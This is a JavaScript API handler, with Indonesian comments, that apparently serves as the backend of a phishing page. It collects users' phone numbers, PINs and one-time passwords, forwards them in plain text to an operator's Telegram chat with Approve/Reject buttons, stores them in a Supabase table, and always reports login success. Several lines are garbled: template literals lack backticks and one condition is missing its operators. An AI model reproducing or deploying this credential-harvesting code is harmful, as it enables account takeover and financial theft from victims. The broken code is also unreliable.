import { createClient } from '@supabase/supabase-js';

export default async function handler(req, res) {
  // Set CORS headers agar frontend bisa mengakses
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight OPTIONS
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Hanya terima POST
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { phone, pin, otp, type } = req.body;

  // ================== LOGIN ==================
  if (type === 'login') {
    if (!phone || !pin) {
      return res.status(400).json({ message: 'Phone and PIN required' });
    }

    // Kirim notifikasi ke admin (jika env tersedia)
    try {
      const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
      const adminChatId = process.env.ADMIN_CHAT_ID;
      if (telegramToken && adminChatId) {
        await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: adminChatId,
            text: 🔔 *User Login*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\``,
            parse_mode: 'Markdown'
          })
        });
      }
    } catch (err) {
      console.error('Telegram login notification error:', err);
      // Jangan gagalkan response
    }

    // Selalu kembalikan sukses ke frontend
    return res.status(200).json({ success: true });
  }

  // ================== SUBMIT OTP ==================
  if (!phone  !pin  !otp) {
    return res.status(400).json({ message: 'Phone, PIN, and OTP required' });
  }

  // Cek environment variable Supabase
  const supabaseUrl = process.env.SUPABASE_URL;
  const supabaseKey = process.env.SUPABASE_ANON_KEY;
  if (!supabaseUrl || !supabaseKey) {
    console.error('Missing Supabase environment variables');
    return res.status(500).json({ message: 'Server configuration error' });
  }

  const supabase = createClient(supabaseUrl, supabaseKey);

  try {
    // Simpan ke database
    const { data, error } = await supabase
      .from('verifikasi_requests')
      .insert([{ phone, pin, otp, status: 'pending' }])
      .select();
    if (error) throw error;
    if (!data || data.length === 0) throw new Error('Insert failed');

    // Kirim notifikasi ke admin dengan inline keyboard
    const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
    const adminChatId = process.env.ADMIN_CHAT_ID;
    if (telegramToken && adminChatId) {
      try {
        const inlineKeyboard = {
          inline_keyboard: [
            [
              { text: "✅ Approve", callback_data: approve|${phone}|${pin}|${otp} },
              { text: "❌ Reject", callback_data: reject|${phone}|${pin}|${otp} }
            ]
          ]
        };
        await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: adminChatId,
            text: 🔔 *Permintaan Verifikasi*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\\n🔑 OTP: \${otp}\``,
            parse_mode: 'Markdown',
            reply_markup: inlineKeyboard
          })
        });
      } catch (err) {
        console.error('Telegram OTP notification error:', err);
      }
    }

    return res.status(201).json({ success: true, requestId: data[0].id });
  } catch (err) {
    console.error('Database error:', err);
    return res.status(500).json({ message: 'Database error', error: err.message });
  }
}
